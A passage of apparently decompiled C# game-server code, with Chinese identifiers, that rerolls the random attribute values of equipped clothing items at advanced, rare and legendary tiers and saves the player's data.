					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠衣服稀有属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠衣服稀有属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠衣服传说属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠衣服传说属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
